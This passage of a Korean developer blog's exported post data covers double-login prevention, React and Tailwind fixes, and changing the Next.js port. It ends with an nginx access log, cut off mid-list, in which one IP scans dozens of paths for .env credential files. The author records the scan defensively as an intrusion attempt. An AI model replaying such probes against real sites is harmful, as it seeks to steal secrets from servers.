[Iron-Session](https://github.com/vvo/iron-session) 등을 사용하면 보안 처리에 더 수월하다.\n\n암호화 하는 이유는 위에서 언급한 문제를 막기 위해서이다.  \n흑우집합소는 Next.Js를 사용하는데 **app.tsx**에서 아래 일련의 작업을 수행한다.\n\n```tsx\nuseEffect(() => {\n  //B-Code가 없다면 심어준다.\n  if (!isExistKeyInLocalStorage(LOCAL_STORAGE_KEY_B_CODE)) {\n    const encryptBCode = cryptoEncrypt(makeClientBCode())\n    setLocalStorageData(LOCAL_STORAGE_KEY_B_CODE, encryptBCode)\n    makeClientCookie(\"b-code\", encryptBCode)\n  }\n  //존재하면 쿠키로 구워준다.\n  else {\n    const bCode = getLocalStorageData(LOCAL_STORAGE_KEY_B_CODE)\n    makeClientCookie(\"b-code\", bCode)\n  }\n}, [])\n```\n\n위에서 **b-code**라는 것이 이중로그인을 막기 위한 토큰 역할을 하는 값이다.  \n이는 다른 방식으로 구현해도 무방하다.\n\n<br>\n\n### 2. 사용자의 로그인 수행\n\n사용자가 로그인 페이지에 접근해서 SNS 로그인을 실행한다.  \n여기선 특별한 작업은 없다.\n\n<br>\n\n### 3. 백엔드 측 SNS 로그인 처리\n\n백엔드에서는 SNS 로그인 콜백을 받은 이후 해당 사용자의 서버측 토큰을 하나 생성해서 로그인 정보와 함께 프론트단에 보내준다.\n\nSNS 로그인 콜백에서 각 정보를 처리하는 과정에서 세션이나 디비에 사용자 정보를 넣을 때 백엔드 토큰을 담아준다.  \n구현방식에 따라 다르겠지만 마지막 로그인 정보(LastLoginInfo) 등을 세션이나 디비에 사용할 것이다.\n\n<br>\n\n### 4. 프론트엔드에서 SNS 로그인 결과 수신\n\n클라이언트는 로그인 정보 수신 후 바로 Axios를 통해 1번에서 생성한 클라이언트 측 토큰을 보내준다.  \n이 작업은 Next.Js의 서버사이드 측(Route Api)에서 작업이 진행된다.\n\n보통 SNS 로그인은 창을 띄우던 내부 페이지를 쓰던 Get 메서드로 서버측 URL을 호출하게 된다.  \n그리고 서버측에서 SNS 콜백 처리 후 프론트엔드 측의 특정 페이지를 호출하게 한다.\n\n흑우집합소의 경우 **Next.Js**를 사용하여, **Route Api**쪽으로 정보를 전달한다.\n그리고 여기서 정상적으로 로그인 정보를 수신했다면, Axios를 통해서 서버측에 암호화된 클라이언트 토큰을 보내준다.\n\n<br>\n\n### 5. 백엔드의 마지막 로그인 정보 변경\n\n서버측에서 프론트엔드의 토큰 정보를 받으면 복호화 후 이를 조합해서 **클라이언트 고유의 값**을 만들어서 저장한다.  \n그리고 디비 또는 세션에 정보를 갱신 후 프론트엔드 측으로 돌려준다.\n\n물론 당연한 이야기겠지만 https를 사용해도 이 값은 암호화 해주는 것이 좋다.  \n프론트엔드에서는 받은 값을 복호화 후 이를 LocalStorage와 Cookie에 갱신해준다.\n\n<br>\n\n### 6. 데이터 전송 시\n\n이제 저 값을 프론트엔드에서 가지고 있다가 Axios 등으로 통신을 할 때 헤더에 같이 실어서 보내면 된다.  \n그리고 서버 측에서는 헤더 값을 JWT 확인할 때 같이 이중 로그인도 확인하면 된다.\n\n<br>\n\n## 정리\n\n코드가 없이 구구절절 설명으로만 적어서 이해가 약간 까다로울 수 있다.  \n근데 내가 사용하는 코드를 다 공개하기엔 내가 못찾은 취약점이 발견될 수도 있고,  \n보안상 외부에 노출되는 것은 좋지 않기에 이 부분은 양해를 구한다.\n\n근데 이 정도 설명만으로도 이중 로그인 해결에 실마리를 얻을 수 있지 않을까 싶다.  \n이중 로그인의 핵심은 **접근자의 고유 값을 구분함**이다.\n\n이렇게 복잡하게 안해도 [StackOverFlow](https://stackoverflow.com/questions/105034/how-do-i-create-a-guid-uuid)에서는 **crypto.randomUUID()**등을 통해서 값을 만들 수 있다.  \n하지만 난 내 방식대로 구현을 해보고 싶어서 위와 같이 구현했다.\n\nJWT를 통해서 구현했던 분들도 이중 로그인 해결을 위해선 서버측에 정보를 써야 하는 부분은 동일하기 때문에,  \n결국 세션이나 디비를 활용해야 하는 부분에 대해 납득하기 어려울(?) 수 있다.\n\n물론 JWT내에 클라이언트와 서버 측 정보를 넣어서 처리할 수도 있다.  \n근데 이렇게 해도 결국 **마지막 로그인 정보의 상태 값**을 서버에서는 어딘가 들고 있어야 하는 부분은 변함이 없다.\n\n서비스가 방대해지면 다른 좋은 방법들(Redis를 통해 세션 구현 등)을 통해서 구현해야 한다.  \n하지만 작은 규모의 서비스라면 이런 방식들로도 쉽게(?) 해결할 수 있다.\n\n이로써 이중 로그인 해결에 대한 개인적 고민, 그리고 해결 방안에 대해 포스팅을 남겼다.  \n나와 비슷한 고민을 하는, 또는 자신만의 실마리를 찾는 분들께 도움이 되었으면 한다.\n\n혹시 더 좋은 방법이나, 개선점이 있다면 댓글로 알려주시면 감사하겠다.\n\n```toc\n\n```\n"},{"excerpt":"배포를 하고 나서... 새벽 2시쯔음 흑우집합소 1.0.2 버전 배포를 했다. 백엔드쪽과 프론트엔드쪽 배포를 끝내고 나서 잘 되나 확인을 해봤다. 근데... 이상한 문제가 발생했다. 프론트엔드 쪽은 TailWindCSS를 사용하고, 거기에 Daisy ui를 사용하고 있다. 근데 이 Daisy UI쪽에서 발생한 문제인 것 같았다. 문제는 아래와 같다.  G…","fields":{"slug":"/til/230504_til/"},"frontmatter":{"date":"May 04, 2023","title":"23년 5월 4일 흑우집합소 개발노트 (Daisy ui  Stat 이상현상)","description":null,"tags":["TIL","흑우집합소"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# 배포를 하고 나서...\n\n새벽 2시쯔음 [흑우집합소](https://bcow.world) 1.0.2 버전 배포를 했다.  \n백엔드쪽과 프론트엔드쪽 배포를 끝내고 나서 잘 되나 확인을 해봤다.\n\n근데...  \n이상한 문제가 발생했다.\n\n프론트엔드 쪽은 **TailWindCSS**를 사용하고, 거기에 [Daisy ui](https://daisyui.com/)를 사용하고 있다.  \n근데 이 **Daisy UI**쪽에서 발생한 문제인 것 같았다.\n\n문제는 아래와 같다.\n\n![](/img01.gif)\n\n<br>\n\nGithub의 Issue 부분을 확인해봤으나, 나와 같은 문제를 일으키는 사람은 없었다.  \n**이는 라이브러리 문제가 아닌 내가 뭔가 잘못 코드를 작성한 문제**라는 방향으로 귀결된다.\n\n분명 개발버전에서는 잘 되었던거 같은데...  \n근데 생객해보니...\n\n개발은 크롬에서 진행했고, 운영 테스트는 사파리에서 진행했다.  \n혹시나 하는 마음에 크롬에서 직접 봐보니 역시 크롬은 문제가 없었다.\n\n## 도데체 무슨 문제일까?\n\n뭐 뻔한 이야기겠지만 브라우저 엔진 문제일 것으로 추측했다.  \n브라우저마다 자바스크립트를 해석하는 방법이 약간 차이가 있기 때문에 저런 버그가 생기는게 아닐까 싶다.\n\n먼저 저쪽 코드는 아래과 같이 되어 있다.\n\n```tsx\n<div className=\"stats stats-vertical mt-10 mb-10 w-full shadow c_mobile:w-11/12 c_l_pc:stats-horizontal\">\n  ... //대략 stat 코드 들어감\n</div>\n```\n\n이 부분에서 의심이 되는 것은 **넓이**와 관련된 부분을 의심했다.  \n그래서 저 코드에서 **w-full**이것을 빼줬더니 넓이가 줄어들고 저 현상은 없어졌다.\n\n다만 UX 관점에서 위와 통일성이 깨져서 이 부분은 어떻게 해야 할지 고민이 되었다.  \n일단 사파리 브라우저 외에는 잘 되는거 같아서 사파리에서만 저렇게 구현하고,  \n그 외에 브라우저는 기존대로 **w-full**을 적용하기로 했다.\n\n## How to?\n\n먼저 window 객체 안에 **userAgent**를 통해서 사파리 브라우저인지 아닌지를 확인할 필요가 있었다.  \n그리고 상태값을 하나 주고 사파리 브라우저인지 아닌지를 체크하는 로직을 추가했다.\n\n```tsx\nconst [isSafari, setIsSafari] = useState(false)\n\nuseEffect(() => {\n  const userAgent = window.navigator.userAgent\n  const isSafari =\n    userAgent.indexOf(\"Safari\") !== -1 && userAgent.indexOf(\"Chrome\") === -1\n  setIsSafari(isSafari)\n}, [])\n```\n\n이렇게 해서 **isSafari** 값을 통해 브라우저 확인할 수 있도록 했다.  \n그리고 기존의 **div** 태그의 className을 아래와 같이 수정했다.\n\n```tsx\n<div\n  className={\n    \"stats stats-vertical mt-10 mb-10 shadow c_mobile:w-11/12 c_l_pc:stats-horizontal \" +\n    (isSafari ? \"flex\" : \"w-full\")\n  }\n></div>\n```\n\n사파리 브라우저의 경우 **flex**를 주고 그 외에는 **w-full**을 줬다.  \n**flex**를 사용할 경우 각 자식 요소를 수평으로 배치할 수 있음을 이용했다.\n\n이렇게 구현했더니 사파리 브라우저에서도 잘 동작했다.\n\n## 정리\n\n개발을 하다 보니 프론트엔드 쪽은 신경 쓸 부분이 참 많은 것 같다.  \nChat GPT에게 이 문제를 물어봤으나 역시 원론적인 답변만 줬다.(영문 & 국문 질문)\n\n당연한 것이 이런 경험적인 부분이나, 동작원리같은 부분은 아직 GPT가 답변하기엔 어려운 부분이 아닐까 싶다.  \n물론 추후 이런 부분도 학습을 하면 나아지겠지만 아직은 무리인 것 같다.\n\n```toc\n\n```\n"},{"excerpt":"React에서 상태 관련 처리를 하다가... 신규 기능 생성번호 당첨내역을 개발하고 있었다. 백엔드 로직 개발을 하고, 프론트쪽 개발로 넘어왔다. 각 로또 등위별 당첨 내역 처리를 위해 아래와 같은 상태 값을 사용했다. 위 상태 값은 아래의 등위별 당첨 내역의 카운트에 쓰인다.  저 등위별 당첨 내역은 컴포넌트로 따서 구현되어 있다. 컴포넌트에서는 use…","fields":{"slug":"/til/230503_til/"},"frontmatter":{"date":"May 04, 2023","title":"23년 5월 3일 흑우집합소 개발노트 (React에서 useState의 상태 처리)","description":null,"tags":["TIL","ReactJS","흑우집합소"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# React에서 상태 관련 처리를 하다가...\n\n신규 기능 **생성번호 당첨내역**을 개발하고 있었다.  \n백엔드 로직 개발을 하고, 프론트쪽 개발로 넘어왔다.\n\n각 로또 등위별 당첨 내역 처리를 위해 아래와 같은 상태 값을 사용했다.\n\n```typescript\nconst [rankInfo, setRankInfo] = useState<RankSummary>({\n  firstRankCnt: 0,\n  secondRankCnt: 0,\n  thirdRankCnt: 0,\n  fourthRankCnt: 0,\n  fifthRankCnt: 0,\n})\n```\n\n위 상태 값은 아래의 등위별 당첨 내역의 카운트에 쓰인다.\n\n![](/img01.png)\n\n<br>\n\n저 등위별 당첨 내역은 컴포넌트로 따서 구현되어 있다.  \n컴포넌트에서는 **useEffect** hook을 이용해서 초기 값을 설정해준다.\n\n```typescript\nuseEffect(() => {\n  const makeLogData = winData.lottoMakeLogData\n\n  setRankInfo({\n    firstRankCnt: 0,\n    secondRankCnt: 0,\n    thirdRankCnt: 0,\n    fourthRankCnt: 0,\n    fifthRankCnt: 0,\n  })\n\n  makeLogData.forEach(item => {\n    if (item.rank === 5) {\n      setRankInfo({\n        ...rankInfo,\n        ...{ fifthRankCnt: rankInfo.fifthRankCnt++ },\n      })\n    } else if (item.rank === 4) {\n      setRankInfo({\n        ...rankInfo,\n        ...{ fourthRankCnt: rankInfo.fourthRankCnt++ },\n      })\n    } else if (item.rank === 3) {\n      setRankInfo({\n        ...rankInfo,\n        ...{ thirdRankCnt: rankInfo.thirdRankCnt++ },\n      })\n    } else if (item.rank === 2) {\n      setRankInfo({\n        ...rankInfo,\n        ...{ secondRankCnt: rankInfo.secondRankCnt++ },\n      })\n    } else if (item.rank === 1) {\n      setRankInfo({\n        ...rankInfo,\n        ...{ firstRankCnt: rankInfo.firstRankCnt++ },\n      })\n    }\n  })\n\n  setRankInfo(updatedRankInfo)\n}, [winData])\n```\n\n근데 이렇게 했더니 계속 값이 증분했다.  \n앞에 초기화 로직을 줬지만 적용되지는 않았다.\n\n## 왜 그런걸까?\n\n이 부분을 찾아보니...  \n아래와 같이 정리할 수 있었다.\n\n> useState hook은 비동기로 동작하기 때문에 setRankInfo가 호출되어도 rankInfo는 즉각적으로 업데이트 되지 않는다.  \n> 그래서 이를 해결하려면 이전상태를 복사한 값을 적용함으로써 해결할 수 있다.\n\n말이 좀 어려운데 아래 솔루션 코드를 보면 알 수 있다.\n\n```typescript\nuseEffect(() => {\n  const makeLogData = winData.lottoMakeLogData\n\n  // 새로운 객체를 생성하여 상태 업데이트를 수행합니다.\n  const updatedRankInfo = {\n    firstRankCnt: 0,\n    secondRankCnt: 0,\n    thirdRankCnt: 0,\n    fourthRankCnt: 0,\n    fifthRankCnt: 0,\n  }\n\n  makeLogData.forEach(item => {\n    if (item.rank === 5) {\n      updatedRankInfo.fifthRankCnt = updatedRankInfo.fifthRankCnt + 1\n    } else if (item.rank === 4) {\n      updatedRankInfo.fourthRankCnt = updatedRankInfo.fourthRankCnt + 1\n    } else if (item.rank === 3) {\n      updatedRankInfo.thirdRankCnt = updatedRankInfo.thirdRankCnt + 1\n    } else if (item.rank === 2) {\n      updatedRankInfo.secondRankCnt = updatedRankInfo.secondRankCnt + 1\n    } else if (item.rank === 1) {\n      updatedRankInfo.firstRankCnt = updatedRankInfo.firstRankCnt + 1\n    }\n  })\n\n  setRankInfo(updatedRankInfo)\n}, [winData])\n```\n\n위와 같이 새로운 객체를 주고 해당 값으로 증가를 해준 다음 해당 값으로 setRankInfo를 보내주면 해결이 된다.\n\n<br>\n\n## 정리\n\n**useState**, **useEffect** 함수는 비동기임을 잘 알고 써야할 것 같다.  \n그나저나 백엔드, 프론트엔드 둘다 왔다갔다 하니 약간 햇갈리기도 한다.\n\n일할때는 역시 정신 똑바로 차리고 해야 할듯...\n\n```toc\n\n```\n"},{"excerpt":"React-Quill을 사용하다가... 공지사항과 게시판 기능 때문에 React Quill을 사용하게 되었다. 그리고 게시글을 등록하면 잘 되었다. 근데 입력을 한 뒤에 열람을 하려 했더니 다음과 같이 출력되었다.  내가 분명 h1이랑 h2 등을 적절하게 섞어서 사용했음에도 저렇게 뜨게 되었다. 그래서 뭐가 문제일까 고민을 좀 했었다. 답은 간단했다. R…","fields":{"slug":"/til/230426_til/"},"frontmatter":{"date":"May 04, 2023","title":"23년 4월 26일 흑우집합소 개발노트 (React-Quill과 TailWinCss 사용 시 Html 폰트 적용 문제)","description":null,"tags":["TIL","흑우집합소"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# React-Quill을 사용하다가...\n\n공지사항과 게시판 기능 때문에 **React Quill**을 사용하게 되었다.  \n그리고 게시글을 등록하면 잘 되었다.\n\n근데 입력을 한 뒤에 열람을 하려 했더니 다음과 같이 출력되었다.\n\n![](/img01.png)\n\n내가 분명 h1이랑 h2 등을 적절하게 섞어서 사용했음에도 저렇게 뜨게 되었다.  \n그래서 뭐가 문제일까 고민을 좀 했었다.\n\n## 답은 간단했다.\n\n**React Quill**을 사용해서 글을 작성하면, Html로 코드가 뿌려진다.\n\n```html\n<h1>폰트 테스트</h1>\n<p><br /></p>\n<h2>포온트 테스트</h2>\n<p><br /></p>\n<p><span style=\"color: rgb(230, 0, 0);\">컬러테스트</span></p>\n<p><br /></p>\n<p><span style=\"background-color: rgb(255, 194, 102);\">배경색 테스트</span></p>\n<p><br /></p>\n<p>ㅇㅇㅇㅇㅇ</p>\n<p>일반 퐅느</p>\n<p><br /></p>\n<p><br /></p>\n<h2>ㅇㄴㅁㄴㅁㅇㄴㅁㅇㅗ2</h2>\n<p><br /></p>\n<p>ㅇㄴㅇㅁㄴㅇ</p>\n<p><br /></p>\n```\n\n<br>\n\n그리고 이것을 열람 페이지에서 올릴 때 아래와 같이 코드를 작성해준다.\n\n```tsx\n<div\n  dangerouslySetInnerHTML={{\n    __html: DOMPurify.sanitize(contents),\n  }}\n/>\n```\n\n<br>\n\n근데 저렇게 적용이 안되는 것은 html 내의 태그가 씹힌다고 유추했다.  \n그래서 이것저것 찾다가 내가 사용하는 **TailWindCss**가 문제일 것 같단 생각이 들었다.\n\n대표적인게 Html 태그 중 **h1**이라는 태그가 있다.  \n근데 **TailWindCss**를 쓰면서 저 태그를 쓰면 태그가 동작하지 않는다.\n\n보통은 다음과 같이 클래스 값을 준다.\n\n```tsx\n<div className=\"text-4xl\">h1</div>\n```\n\n그럼 저것 때문 아닐까?  \n역시 예상대로였다.  \n**globals.css**에 아래와 같은 내용을 적용했다.\n\n```css\n@layer base {\n  h1 {\n    @apply text-4xl;\n    @apply font-bold;\n  }\n  h2 {\n    @apply text-3xl;\n    @apply font-bold;\n  }\n  h3 {\n    @apply text-2xl;\n    @apply font-bold;\n  }\n  h4 {\n    @apply text-xl;\n    @apply font-semibold;\n  }\n}\n```\n\n이렇게 하고 나니 잘 동작했다.\n\n![](/img02.png)\n\n```toc\n\n```\n"},{"excerpt":"NextJs에서 포트를 변경하기 Next.Js의 기본 포트는 3000으로 되어 있다. 개발용으로 쓸 때는 상관 없지만, 실무 레벨에서 쓸 때는 포트를 변경해야 한다. 이유야 뭐 알려진 포트를 사용하는 것은 좋지 않기 때문이다. 또는 3000번이 이미 다른 서비스를 사용하는데 쓰고 있을 수 있기 때문이다. 바꾸는 방법은 매우 간단하고, 두 가지 방법이 있다…","fields":{"slug":"/next-js/230428_change_port/"},"frontmatter":{"date":"April 28, 2023","title":"Next.Js에서 포트 변경하기","description":null,"tags":["NextJs"],"series":"NextJs","previewImage":"nextjs_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nextjs.png)\n\n# NextJs에서 포트를 변경하기\n\n**Next.Js**의 기본 포트는 **3000**으로 되어 있다.  \n개발용으로 쓸 때는 상관 없지만, 실무 레벨에서 쓸 때는 포트를 변경해야 한다.\n\n이유야 뭐 알려진 포트를 사용하는 것은 좋지 않기 때문이다.  \n또는 3000번이 이미 다른 서비스를 사용하는데 쓰고 있을 수 있기 때문이다.\n\n바꾸는 방법은 매우 간단하고, 두 가지 방법이 있다.\n\n## 1. package.json에서 바꿔주기\n\n**package.json** 파일을 열어준다.  \n거기서 **scripts** 항목을 간다.\n\n```json\n\"scripts\": {\n  \"dev\": \"next -p 3002\",\n  \"build\": \"next build\",\n  \"start\": \"next start -p 3002\",\n},\n```\n\n위 처럼 -p 인자를 통해 변경할 수 있다.\n\n## 2. npm, yarn 등 커맨드에서 변경하기\n\n```\n# Yarn - 터미널 사용 시\nyarn dev -p 3002\n\n# NPM - 터미널 사용 시\nnpm run dev -- -p 3002\n\n# NPM - 파일에서 사용 시\nnpm run dev -p 3002\n```\n\n여기서 주의해야 할 부분은 터미널에서 사용할 때 npm을 사용하는 부분인데 **- -** 표시를 빼고 사용할 경우 에러가 발생한다.\n\n> **왜냐하면 -p만 사용할 때는 port를 의미하는 것이 아닌 prefix로 받아들이기 때문이다.**\n\n그래서 npm을 터미널에서 사용할 때는 저 하이픈 2개를 붙여주는 것을 잊지 말자.\n\n```toc\n\n```\n"},{"excerpt":"내 취미는 매일 나는 nginx log를 보는 것 요새 새로운 취미 생활이다. 흑우집합소 배포 이후 이상한 놈들이 불법으로 접근하는지 체크한다. 그래서 아침에 일어나서 컴퓨터 키고 nginx 로그를 본다. 로그를 보면 가관이다. 1. 불법 침입 흔적 아래는 접근한 불법 침입자 로그다. 44.202.140.249 악의적 사용자는 계속 특정 키워드 url로 …","fields":{"slug":"/til/230420_til/"},"frontmatter":{"date":"April 28, 2023","title":"23년 4월 20일 TIL & 개발노트 (nginx 외부 불법 침입 시도 및 google adsense 관련)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# 내 취미는 매일 나는 nginx log를 보는 것\n\n요새 새로운 취미 생활이다.  \n흑우집합소 배포 이후 이상한 놈들이 불법으로 접근하는지 체크한다.\n\n그래서 아침에 일어나서 컴퓨터 키고 nginx 로그를 본다.  \n로그를 보면 가관이다.\n\n## 1. 불법 침입 흔적\n\n아래는 접근한 불법 침입자 로그다.\n\n```\n66.102.6.190 - - [20/Apr/2023:03:55:00 +0900] \"GET / HTTP/1.1\" 301 178 \"-\" \"Google-Display-Ads-Bot\"\n44.202.140.249 - - [20/Apr/2023:04:04:55 +0900] \"GET / HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:04:56 +0900] \"GET /.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:04:57 +0900] \"GET /.remote HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:04:57 +0900] \"GET /.local HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:04:58 +0900] \"GET /.production HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:04:59 +0900] \"GET //vendor/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:04:59 +0900] \"GET //lib/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:00 +0900] \"GET //lab/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:00 +0900] \"GET //cronlab/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:01 +0900] \"GET //cron/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:01 +0900] \"GET //core/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:02 +0900] \"GET //core/app/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:02 +0900] \"GET //core/Datavase/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:03 +0900] \"GET //database/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:04 +0900] \"GET //config/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:04 +0900] \"GET //assets/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:05 +0900] \"GET //app/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:05 +0900] \"GET //apps/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:06 +0900] \"GET //uploads/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:06 +0900] \"GET //sitemaps/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:07 +0900] \"GET //saas/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:07 +0900] \"GET //api/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:08 +0900] \"GET //psnlink/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:08 +0900] \"GET //exapi/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:09 +0900] \"GET //site/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:09 +0900] \"GET //admin/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:10 +0900] \"GET //web/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:10 +0900] \"GET //public/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:11 +0900] \"GET //en/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:11 +0900] \"GET //tools/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:12 +0900] \"GET //v1/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:13 +0900] \"GET //v2/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:13 +0900] \"GET //administrator/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 Safari/535.23\"\n44.202.140.249 - - [20/Apr/2023:04:05:13 +0900] \"GET //laravel/.env HTTP/1.1\" 301 178 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.35 (KHTML, like Gecko) Chrome/7.0.917.68 